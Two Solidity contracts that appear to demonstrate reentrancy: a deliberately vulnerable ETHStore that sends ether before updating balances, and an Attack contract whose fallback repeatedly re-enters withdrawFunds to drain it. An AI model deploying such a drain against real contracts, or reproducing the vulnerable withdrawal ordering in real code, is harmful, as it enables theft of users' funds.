// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.7.0;
import "./ETHStore.sol";

contract Attack {
    ETHStore store;

    fallback() external payable {
        if (address(store).balance > 1 ether) {
            store.withdrawFunds(1 ether);
        }
    }

    constructor(address _store) public {
        store = ETHStore(_store);
    }

    function Attach() public {
        //发起攻击函数
        store.deposit{ value: 1 ether }(); //保证withdrawFunds初步检查不出问题
        store.withdrawFunds(1 ether);
    }
}

// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.7.0;

contract ETHStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{ value: _weiToWithdraw }("");
        require(send, "send failed");
        balances[msg.sender] -= _weiToWithdraw;
    }
}